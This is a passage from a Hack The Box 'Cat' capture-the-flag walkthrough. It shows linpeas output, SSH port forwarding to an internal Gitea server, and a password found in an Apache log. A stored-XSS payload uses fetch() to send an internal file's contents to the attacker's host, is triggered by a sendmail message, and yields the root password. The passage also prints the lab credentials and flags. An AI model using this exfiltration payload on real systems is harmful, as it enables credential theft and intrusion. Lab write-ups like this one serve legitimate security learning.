/var/log/auth.log.1:Jan 21 12:45:26 cat sshd[13865]: Accepted password for axel from 10.10.14.66 port 60208 ssh2
/var/log/auth.log.1:Jan 21 12:45:30 cat sshd[13966]: Accepted password for axel from 10.10.14.66 port 59466 ssh2
/var/log/auth.log.1:Jan 21 12:45:49 cat sshd[14038]: Accepted password for axel from 10.10.14.66 port 55844 ssh2
/var/log/auth.log.1:Jan 21 12:50:26 cat sshd[1318]: Accepted password for axel from 10.10.14.66 port 55830 ssh2
/var/log/auth.log.1:Jan 21 12:50:33 cat sshd[1483]: Accepted password for axel from 10.10.14.66 port 41536 ssh2

[+] Finding emails inside logs (limited 100)
      7 /var/log/audit/audit.log.4:xfs_scrub_fail@.service.dpkg                                                     
      7 /var/log/audit/audit.log.4:xfs_scrub@.service.dpkg
      1 /var/log/audit/audit.log:benh@debian.org.key.pub.pem
      4 /var/log/bootstrap.log:ftpmaster@ubuntu.com
      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
      1 /var/log/installer/installer-journal.txt:giometti@linux.it
      8 /var/log/kern.log.1:dm-devel@redhat.com
      8 /var/log/kern.log.1:giometti@linux.it
      6 /var/log/kern.log:dm-devel@redhat.com
      6 /var/log/kern.log:giometti@linux.it
      2 /var/log/mail.log.1:202501221305.50MD51Ye001484@cat.htb
      2 /var/log/mail.log.1:202501271600.50RG01bT012871@cat.htb
      2 /var/log/mail.log.1:202501271600.50RG01Y6012878@cat.htb
      2 /var/log/mail.log.1:202501271605.50RG51Qi012975@cat.htb
     12 /var/log/mail.log.1:root@cat.htb
      2 /var/log/mail.log:202501301535.50UFZ1GB001573@cat.htb
      2 /var/log/mail.log:202501301540.50UFe1J0001389@cat.htb
      2 /var/log/mail.log:202501301540.50UFe1Sq001398@cat.htb
      1 /var/log/mail.log:202501311117.50VBHU1W001138@cat.htb
      1 /var/log/mail.log:202501311117.50VBHU1X001138@cat.htb
      2 /var/log/mail.log:202501311120.50VBK19R001659@cat.htb
      2 /var/log/mail.log:202501311120.50VBK1Ks001674@cat.htb
      2 /var/log/mail.log:202501311125.50VBP1xv001739@cat.htb
      2 /var/log/mail.log:202501311130.50VBU1kA001811@cat.htb
      2 /var/log/mail.log:202501311135.50VBZ1Ve004285@cat.htb
      2 /var/log/mail.log:202501311140.50VBe1Mr008453@cat.htb
      2 /var/log/mail.log:202501311140.50VBe1Si008447@cat.htb
      2 /var/log/mail.log:202501311145.50VBj1Df008518@cat.htb
      2 /var/log/mail.log:202501311230.50VCU1Sx001706@cat.htb
      2 /var/log/mail.log:202502030815.5138F1VS001490@cat.htb
      2 /var/log/mail.log:202502030820.5138K18B001585@cat.htb
      2 /var/log/mail.log:202502030820.5138K1Q6001560@cat.htb
      2 /var/log/mail.log:202502030825.5138P10w001693@cat.htb
      2 /var/log/mail.log:202502030830.5138U1Gi001770@cat.htb
      2 /var/log/mail.log:202502030835.5138Z1Rf001945@cat.htb
      2 /var/log/mail.log:202502030840.5138e1ah002092@cat.htb
      2 /var/log/mail.log:202502030840.5138e2wp002121@cat.htb
      2 /var/log/mail.log:202502030845.5138j1e7002193@cat.htb
      2 /var/log/mail.log:202502030850.5138o1LK002248@cat.htb
      2 /var/log/mail.log:202502030855.5138t1LW002305@cat.htb
      2 /var/log/mail.log:202502030900.513901aR002582@cat.htb
      2 /var/log/mail.log:202502030900.513901UB002569@cat.htb
      2 /var/log/mail.log:202502030905.513951pV002960@cat.htb
      2 /var/log/mail.log:202502030910.5139A2du003149@cat.htb
      2 /var/log/mail.log:202502030915.5139F1D8004719@cat.htb
      2 /var/log/mail.log:202502030915.5139FaJj006260@cat.htb
     87 /var/log/mail.log:root@cat.htb
      2 /var/log/mail.log:rosa@cat.htb
      1 /var/log/syslog.1:202501301540.50UFe1J0001389@cat.htb
      1 /var/log/syslog.1:202501301540.50UFe1Sq001398@cat.htb
      1 /var/log/syslog.1:202501311117.50VBHU1W001138@cat.htb
      1 /var/log/syslog.1:202501311117.50VBHU1X001138@cat.htb
      2 /var/log/syslog.1:202501311120.50VBK19R001659@cat.htb
      2 /var/log/syslog.1:202501311120.50VBK1Ks001674@cat.htb
      2 /var/log/syslog.1:202501311125.50VBP1xv001739@cat.htb
      2 /var/log/syslog.1:202501311130.50VBU1kA001811@cat.htb
      2 /var/log/syslog.1:202501311135.50VBZ1Ve004285@cat.htb
      2 /var/log/syslog.1:202501311140.50VBe1Mr008453@cat.htb
      2 /var/log/syslog.1:202501311140.50VBe1Si008447@cat.htb
      2 /var/log/syslog.1:202501311145.50VBj1Df008518@cat.htb
      2 /var/log/syslog.1:202501311230.50VCU1Sx001706@cat.htb
      2 /var/log/syslog.1:dm-devel@redhat.com
      2 /var/log/syslog.1:giometti@linux.it
     35 /var/log/syslog.1:root@cat.htb
      2 /var/log/syslog:202502030815.5138F1VS001490@cat.htb
      2 /var/log/syslog:202502030820.5138K18B001585@cat.htb
      2 /var/log/syslog:202502030820.5138K1Q6001560@cat.htb
      2 /var/log/syslog:202502030825.5138P10w001693@cat.htb
      2 /var/log/syslog:202502030830.5138U1Gi001770@cat.htb
      2 /var/log/syslog:202502030835.5138Z1Rf001945@cat.htb
      2 /var/log/syslog:202502030840.5138e1ah002092@cat.htb
      2 /var/log/syslog:202502030840.5138e2wp002121@cat.htb
      2 /var/log/syslog:202502030845.5138j1e7002193@cat.htb
      2 /var/log/syslog:202502030850.5138o1LK002248@cat.htb
      2 /var/log/syslog:202502030855.5138t1LW002305@cat.htb
      2 /var/log/syslog:202502030900.513901aR002582@cat.htb
      2 /var/log/syslog:202502030900.513901UB002569@cat.htb
      2 /var/log/syslog:202502030905.513951pV002960@cat.htb
      2 /var/log/syslog:202502030910.5139A2du003149@cat.htb
      2 /var/log/syslog:202502030915.5139F1D8004719@cat.htb
      2 /var/log/syslog:202502030915.5139FaJj006260@cat.htb
     49 /var/log/syslog:root@cat.htb
      2 /var/log/syslog:rosa@cat.htb

[+] Finding 'pwd' or 'passw' string inside /home, /var/www, /etc, /root and list possible web(/var/www) and config(/etc) passwords                                                                                                      
/etc/apache2/sites-available/default-ssl.conf:          #        file needs this password: `xxj31ZMTZzkVA'.         
/etc/apache2/sites-available/default-ssl.conf:          #        Note that no password is obtained from the user. Every entry in the user
/etc/apparmor.d/abstractions/authentication:  # databases containing passwords, PAM configuration files, PAM libraries
/etc/debconf.conf:Accept-Type: password
/etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
/etc/debconf.conf:Name: passwords
/etc/debconf.conf:Reject-Type: password
/etc/debconf.conf:Stack: config, passwords
/etc/ssh/sshd_config:PasswordAuthentication Yes
```

## SSH Port Forwading

So now if I will do a port forwarding I will have to be able to reach it normally. This will be necessary for later. 

```
┌──(kali㉿kali)-[~/…/Cat/GitHacker/result/cbd584a870bc23c228bfffe42f75330d]
└─$ ssh rosa@cat.htb -L 3000:127.0.0.1:3000
```

This is the webpage that runs on the localhost with port 3000.

![[Pasted image 20250203103443.png]]

Below you will be able to see that this is running on "Gitea version 1.22.0.". We are going to need this later for an exploit search.

![[Pasted image 20250203105956.png]]

So now I went to look in the “/var/log/apache2” because it said in linpeas that there are interesting files there. So I went to open the “access.log” file and there I found axel's password.

| Username | Password             |
| -------- | -------------------- |
| axel     | aNdZwgC4tI9gnVXv_e3Q |
```
127.0.0.1 - - [31/Jan/2025:12:30:03 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [31/Jan/2025:12:30:03 +0000] "GET / HTTP/1.1" 200 1436 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
```

## SSH as Axel

So now we can start changing users by executing the following command.

```
rosa@cat:/var/log/apache2$ su axel
Password:aNdZwgC4tI9gnVXv_e3Q --> (Password is not visible)
```

So now if I will go to axel's home directory I will see the first flag “User Flag” there.

User Flag = 455ef4353be3365bb70a23f3bfb031a7

```
axel@cat:/var/log$ cd
axel@cat:~$ ls
user.txt
axel@cat:~$ cat user.txt
455ef4353be3365bb70a23f3bfb031a7
```

Within Linpeas, I had also seen that there was a path mails. I went to look into this and saw the following as output.

```
axel@cat:/var/mail$ cat axel
From rosa@cat.htb  Sat Sep 28 04:51:50 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S4pnXk001592
        for <axel@cat.htb>; Sat, 28 Sep 2024 04:51:50 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S4pnlT001591
        for axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT
Date: Sat, 28 Sep 2024 04:51:49 GMT
From: rosa@cat.htb
Message-Id: <202409280451.48S4pnlT001591@cat.htb>
Subject: New cat services

Hi Axel,

We are planning to launch new cat-related web services, including a cat care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check if it is a promising service that we can develop.

Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.

From rosa@cat.htb  Sat Sep 28 05:05:28 2024
Return-Path: <rosa@cat.htb>
Received: from cat.htb (localhost [127.0.0.1])
        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP id 48S55SRY002268
        for <axel@cat.htb>; Sat, 28 Sep 2024 05:05:28 GMT
Received: (from rosa@localhost)
        by cat.htb (8.15.2/8.15.2/Submit) id 48S55Sm0002267
        for axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT
Date: Sat, 28 Sep 2024 05:05:28 GMT
From: rosa@cat.htb
Message-Id: <202409280505.48S55Sm0002267@cat.htb>
Subject: Employee management

We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.
```

So within the web page to where we did the port forwarding, I will now have to start logging in. This will be done using axel's credentials.

| Username | Password             |
| -------- | -------------------- |
| axel     | aNdZwgC4tI9gnVXv_e3Q |

![[Pasted image 20250203110511.png]]
Once I logged in I started looking for an exploit for this web page. Since that I already knew that it was running on "Gitea version 1.22.0", so I started looking for an exploit. In doing so, I found the following exploit. https://www.exploit-db.com/exploits/52077

## Cross-site Scripting Pt.2

Within the exploit we are told that we will have to put an XSS payload in the description of the repository. If we are going to look at the mail from axel in the SSH connection the payload will have to look like this.

```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.16.13:8001/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">XSS test</a>
```

What will this payload do?
This is an XSS attack where data is retrieved from an internal server `localhost on port 3000` and forwarded to my own machine. This is done via a fetch request that the server response will start to intercept and send.

For this we will have to set up a listener. We will do this by using the following command.

```
python3 -m http.server 8001 --> This is the port i also used in our XSS-payload script.
```

We need to send a mail to jobert because it can make the connection to the index file from the `administrator/Employee-management/raw/branch/main` path where that contains the credentials of the root user. we will do this using the following command.

```
axel@cat:~$ echo -e "Subject: test \n\nHello check my repo http://localhost:3000/axel/test.git" | sendmail jobert@localhost
```

Once this mail has been sent we will see the following on our listener connection.

```
┌──(kali㉿kali)-[~/HTB/Cat/linux-privilege-escalation-awsome-script]
└─$ python3 -m http.server 8001
Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...
10.129.71.234 - - [03/Feb/2025 11:41:36] "GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1" 200 -
10.129.71.234 - - [03/Feb/2025 11:41:58] "GET /?response=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24vERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SSERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authentic0header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard
```

I went to ChatGPT to ask for the password for me to go decrypt. The credentials of the user root is as follows.

| Username | Password           |
| -------- | ------------------ |
| root     | IKw75eR0MR7CMIxhH0 |
![[Pasted image 20250203115851.png]]

## SSH as Root

Now if I will go to axel's connection and change there from user to root by entering the credentials from above, you will be able to see that we have become root.

```
axel@cat:~$ su root
Password: 
su: Authentication failure
axel@cat:~$ su root
Password: 
root@cat:/home/axel# 

```

so now if we go to the root user's home directory we will have the 2nd flag (Root flag) there. 

Root flag = 8928a29b2bc0f27e08b007afe542d4f4

```
root@cat:/home# ls
axel  git  jobert  rosa
root@cat:/home# cd 
root@cat:~# ls
root.txt  scripts
root@cat:~# cat root.txt 
8928a29b2bc0f27e08b007afe542d4f4
root@cat:~# 

```

## Rooted

![[Pasted image 20250203115922.png]]